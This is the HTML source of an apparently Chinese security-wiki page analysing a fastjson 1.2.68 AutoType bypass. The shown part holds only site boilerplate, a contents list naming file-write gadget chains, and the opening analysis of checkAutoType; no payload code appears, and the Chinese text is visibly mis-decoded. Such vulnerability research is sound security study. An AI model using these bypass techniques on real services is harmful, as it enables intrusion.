<!doctype html>
<html lang="zh-CN" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.9" />
    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.33" />
    <style>
      html {
        background: var(--bg-color, #fff);
      }

      html[data-theme="dark"] {
        background: var(--bg-color, #1d1e1f);
      }

      body {
        background: var(--bg-color);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <meta property="og:url" content="https://github.com/zha0cai/SecWikiPublic/secwiki/codereview/%E3%80%90JavaSec%E3%80%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(%E2%85%A3).html"><meta property="og:site_name" content="One-Piece"><meta property="og:title" content="fastjson ååºåˆ—åŒ– (â…£) - 1.2.68 Bypass AutoTypeSupport"><meta property="og:description" content="fastjson 1.2.48 - 1.2.67 å…¶å®ä» 1.2.48â€‹ â€‹ç‰ˆæœ¬å¼€å§‹å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œç½‘ä¸ŠæŠ«éœ²äº†å¾ˆå¤šç»•è¿‡é»‘åå•çš„ç”¨äº JNDI æ³¨å…¥çš„åˆ©ç”¨é“¾ï¼Œå…¶å®å½±å“éƒ½ä¸å¤§ï¼ŒåŸå› æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š å‰ææ¡ä»¶æ˜¯ fastjson å¼€å¯äº† AutoTypeã€‚ åˆ©ç”¨é“¾éœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹ jarï¼Œæœ‰ä¸€äº› jar è¿˜æ˜¯å¾ˆå°‘ç”¨åˆ°çš„ã€‚ fastjson 1.2.68 å‰ç½®åˆ†æ åœ¨..."><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2024-04-30T06:50:05.000Z"><meta property="article:author" content="Mr.zha0cai"><meta property="article:modified_time" content="2024-04-30T06:50:05.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"fastjson ååºåˆ—åŒ– (â…£) - 1.2.68 Bypass AutoTypeSupport","image":[""],"dateModified":"2024-04-30T06:50:05.000Z","author":[{"@type":"Person","name":"Mr.zha0cai","url":"https://github.com/zha0cai"}]}</script><title>fastjson ååºåˆ—åŒ– (â…£) - 1.2.68 Bypass AutoTypeSupport | One-Piece</title><meta name="description" content="fastjson 1.2.48 - 1.2.67 å…¶å®ä» 1.2.48â€‹ â€‹ç‰ˆæœ¬å¼€å§‹å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œç½‘ä¸ŠæŠ«éœ²äº†å¾ˆå¤šç»•è¿‡é»‘åå•çš„ç”¨äº JNDI æ³¨å…¥çš„åˆ©ç”¨é“¾ï¼Œå…¶å®å½±å“éƒ½ä¸å¤§ï¼ŒåŸå› æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š å‰ææ¡ä»¶æ˜¯ fastjson å¼€å¯äº† AutoTypeã€‚ åˆ©ç”¨é“¾éœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹ jarï¼Œæœ‰ä¸€äº› jar è¿˜æ˜¯å¾ˆå°‘ç”¨åˆ°çš„ã€‚ fastjson 1.2.68 å‰ç½®åˆ†æ åœ¨...">
    <link rel="stylesheet" href="/SecWikiPublic/secwiki/assets/css/styles.9ff32cca.css">
    <link rel="preload" href="/SecWikiPublic/secwiki/assets/js/runtime~app.ec83fc56.js" as="script"><link rel="preload" href="/SecWikiPublic/secwiki/assets/css/styles.9ff32cca.css" as="style"><link rel="preload" href="/SecWikiPublic/secwiki/assets/js/335.d146fa33.js" as="script"><link rel="preload" href="/SecWikiPublic/secwiki/assets/js/app.2bb4161d.js" as="script">
    <link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/PostgreSQL Attack.html.fb8e7a60.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson ååºåˆ—åŒ– (â…£).html.ad01e7e6.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson ååºåˆ—åŒ– (â… ).html.124df4c9.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CORS è·¨åŸŸæ¼æ´.html.e56cc8f2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson ååºåˆ—åŒ– (â…¢).html.9eb19194.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson ååºåˆ—åŒ– (â…¡).html.815c7787.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/å›¾ç‰‡ XSS.html.eeb0e0e2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/URI ç›¸å…³çŸ¥è¯†.html.6d4665c2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/nodejs ä¸ nvmã€npmã€pnmpã€yarnã€corepack çš„å…³ç³».html.817dbbc8.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CSV æ³¨å…¥.html.882f01f7.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/photo-swipe.7839c4e7.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CDN æ”»å‡»æŒ‡å—.html.95c04dd1.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/JdbcRowSetImpl JNDI æ³¨å…¥åˆ©ç”¨é“¾.html.a723028d.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson payload åˆé›†.html.6a2e829c.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/Java å†…çœï¼ˆIntrospectionï¼‰.html.3eb8329d.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/åˆ©ç”¨ TemplatesImpl æ‰§è¡Œå­—èŠ‚ç .html.9f0cd1f6.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/Microsoft Windows MHTML è„šæœ¬ä»£ç æ³¨å…¥æ¼æ´.html.c437896d.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/giscus.324c03f1.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/xss2pdf-åˆ¶ä½œ.html.649d564a.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CRLF Injection.html.5f2ba8a6.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/index.html.edc1e12b.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/EXAMPLE_README.html.7027e490.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/404.html.8e08ef19.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">è·³è‡³ä¸»è¦å…§å®¹</a><!--]--><div class="theme-container has-toc"><!--[--><header id="navbar" class="vp-navbar"><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><!--[--><a class="route-link vp-brand" href="/SecWikiPublic/secwiki/"><img class="vp-nav-logo" src="https://avatars.githubusercontent.com/u/111300972?v=4" alt><!----><span class="vp-site-name hide-in-pad">One-Piece</span></a><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--><!--[--><nav class="vp-nav-links"><div class="vp-nav-item hide-in-mobile"><a class="route-link nav-link" href="/SecWikiPublic/secwiki/" aria-label="One-Piece"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>One-Piece<!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://zha0cai.github.io/SecWikiPublic/secwiki/websec/" rel="noopener noreferrer" target="_blank" aria-label="WebSec" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span>WebSec<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://zha0cai.github.io/SecWikiPublic/secwiki/redteam/" rel="noopener noreferrer" target="_blank" aria-label="RedTeam" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span>RedTeam<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://theme-hope.vuejs.press/zh/" rel="noopener noreferrer" target="_blank" aria-label="V2 å®˜æ–¹æ–‡æ¡£" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span>V2 å®˜æ–¹æ–‡æ¡£<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div></nav><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!--]--><!--[--><!----><div class="vp-nav-item vp-action"><a class="vp-action-link" href="https://github.com/zha0cai" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><div class="vp-nav-item hide-in-mobile"><button type="button" id="appearance-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!----><!--]--><!--[--><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar"><!--[--><!----><!--]--><ul class="vp-sidebar-links"><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/SecWikiPublic/secwiki/" aria-label="One-Piece"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>One-Piece<!----></a></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span><span class="vp-sidebar-title">WebSec</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span><span class="vp-sidebar-title">RedTeam</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span><span class="vp-sidebar-title">ä»£ç å®¡è®¡</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-code" style=""></span><span class="vp-sidebar-title">Pwn</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-dev" style=""></span><span class="vp-sidebar-title">å®‰å…¨å¼€å‘</span><span class="vp-arrow end"></span></button><!----></section></li><li><a href="https://plugin-md-enhance.vuejs.press/zh/guide/content/revealjs/demo.html" rel="noopener noreferrer" target="_blank" aria-label="å¹»ç¯ç‰‡" class="nav-link vp-sidebar-link vp-sidebar-page"><span class="font-icon icon fa-fw fa-sm fas fa-person-chalkboard" style=""></span>å¹»ç¯ç‰‡<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></li></ul><!--[--><!----><!--]--></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!--[--><!----><!--]--><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->fastjson ååºåˆ—åŒ– (â…£) - 1.2.68 Bypass AutoTypeSupport</h1><div class="page-info"><span class="page-author-info" aria-label="ä½œè€…ğŸ–Š" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://github.com/zha0cai" target="_blank" rel="noopener noreferrer">Mr.zha0cai</a></span><span property="author" content="Mr.zha0cai"></span></span><!----><span class="page-date-info" aria-label="å†™ä½œæ—¥æœŸğŸ“…" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span><!----></span><meta property="datePublished" content="2024-04-30T06:50:05.000Z"></span><!----><span class="page-reading-time-info" aria-label="é˜…è¯»æ—¶é—´âŒ›" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>å¤§çº¦ 30 åˆ†é’Ÿ</span><meta property="timeRequired" content="PT30M"></span><!----><!----></div><hr></div><div class="vp-toc-placeholder"><aside id="toc"><!--[--><!----><!--]--><div class="vp-toc-header">æ­¤é¡µå†…å®¹<button type="button" class="print-button" title="æ‰“å°"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button><div class="arrow end"></div></div><div class="vp-toc-wrapper"><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#fastjson-1-2-48-1-2-67">fastjson 1.2.48 - 1.2.67</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#fastjson-1-2-68">fastjson 1.2.68</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#å‰ç½®åˆ†æ">å‰ç½®åˆ†æ</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#bypass-autotypesupport">Bypass AutoTypeSupport</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#throwable-åˆ©ç”¨">Throwable åˆ©ç”¨</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#autocloseable-åˆ©ç”¨">AutoCloseable åˆ©ç”¨</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#åˆ©ç”¨é“¾">åˆ©ç”¨é“¾</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#gadget-1-å¤åˆ¶æ–‡ä»¶">Gadget 1ï¼šå¤åˆ¶æ–‡ä»¶</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#gadget-2-å†™æ–‡ä»¶">Gadget 2ï¼šå†™æ–‡ä»¶</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#gadget-3-åŸç”Ÿå†™æ–‡ä»¶-â€‹openjdk-11â€‹">Gadget 3ï¼šåŸç”Ÿå†™æ–‡ä»¶ï¼ˆâ€‹openjdk &gt;= 11â€‹ï¼‰</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#gadget-4-åŸç”Ÿå†™æ–‡ä»¶-jdk8-10">Gadget 4ï¼šåŸç”Ÿå†™æ–‡ä»¶ï¼ˆJDK8/10ï¼‰</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#gadget-5-å†™æ–‡ä»¶">Gadget 5ï¼šå†™æ–‡ä»¶</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#fatjar-å†™æ–‡ä»¶å®æˆ˜">Fatjar å†™æ–‡ä»¶å®æˆ˜</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#æµ‹è¯•">æµ‹è¯•</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#linux-ä¸‹æˆåŠŸ">Linux ä¸‹æˆåŠŸ</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#å¸¸è§-jdk-ç›®å½•è®°å½•">å¸¸è§ jdk ç›®å½•è®°å½•</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#class-å†™æ–‡ä»¶å®æˆ˜">class å†™æ–‡ä»¶å®æˆ˜</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#åŸç†-2">åŸç†</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#å®è·µ">å®è·µ</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#æ€»ç»“">æ€»ç»“</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#å‰äººæ ½æ ‘">å‰äººæ ½æ ‘</a></li><!----><!--]--></ul><div class="vp-toc-marker" style="top:-1.7rem;"></div></div><!--[--><!----><!--]--></aside></div><!--[--><!----><!--]--><div class="theme-hope-content"><h2 id="fastjson-1-2-48-1-2-67" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-48-1-2-67"><span>fastjson 1.2.48 - 1.2.67</span></a></h2><p>å…¶å®ä» <code>1.2.48</code>â€‹ â€‹ç‰ˆæœ¬å¼€å§‹å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œç½‘ä¸ŠæŠ«éœ²äº†å¾ˆå¤šç»•è¿‡é»‘åå•çš„ç”¨äº JNDI æ³¨å…¥çš„åˆ©ç”¨é“¾ï¼Œå…¶å®å½±å“éƒ½ä¸å¤§ï¼ŒåŸå› æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><ul><li>å‰ææ¡ä»¶æ˜¯ fastjson <mark>å¼€å¯äº† AutoType</mark>ã€‚</li><li>åˆ©ç”¨é“¾éœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹ jarï¼Œæœ‰ä¸€äº› jar è¿˜æ˜¯å¾ˆå°‘ç”¨åˆ°çš„ã€‚</li></ul><h2 id="fastjson-1-2-68" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-68"><span>fastjson 1.2.68</span></a></h2><h3 id="å‰ç½®åˆ†æ" tabindex="-1"><a class="header-anchor" href="#å‰ç½®åˆ†æ"><span>å‰ç½®åˆ†æ</span></a></h3><p>åœ¨ä¸å¼€èµ· AutoType çš„æƒ…å†µä¸‹ <code>public Class&lt;?&gt; checkAutoType(String typeName, Class? expectClass, int features) {}</code>â€‹ ä¸­å­˜åœ¨ä»¥ä¸‹ case å¯ä»¥è¿”å› clazz å¯¹è±¡ã€‚</p><p><strong>ã€autoTypeCheckHandlersã€‘</strong></p><p>autoTypeCheckHandlers ä¸ä¸º nullï¼Œé€šè¿‡æ­¤ç§æ–¹å¼æ¥è¿”å› classã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428160822-o62ilgi.5cb054b4.png" alt="image" loading="lazy">â€‹</p><p><strong>ã€getClassFromMappingã€‘</strong></p><p>ç¼“å­˜ mapping ä¸­çš„ç±»ï¼Œ<code>com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</code>â€‹ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428161043-dguooot.8cf2fb3d.png" alt="image" loading="lazy">â€‹</p><p><strong>ã€éé»‘åå•ä¸”åœ¨ç™½åå•ä¸­çš„ç±»ã€‘</strong></p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428161639-xkl3crb.a6cf0323.png" alt="image" loading="lazy">â€‹</p><p><strong>ã€ä½¿ç”¨ jsonType æ³¨è§£çš„ç±»ã€‘</strong></p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428162131-0td4jsm.406369ff.png" alt="image" loading="lazy">â€‹</p><p><strong>ã€@type ååºåˆ—åŒ–æ—¶æŒ‡å®šäº† expectclassã€‘</strong></p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428162338-84vez4l.33cd98bc.png" alt="image" loading="lazy">â€‹</p><h3 id="bypass-autotypesupport" tabindex="-1"><a class="header-anchor" href="#bypass-autotypesupport"><span>Bypass AutoTypeSupport</span></a></h3><p>åœ¨ 1.2.47 ç‰ˆæœ¬æ¼æ´çˆ†å‘ä¹‹åï¼Œå®˜æ–¹åœ¨ 1.2.48 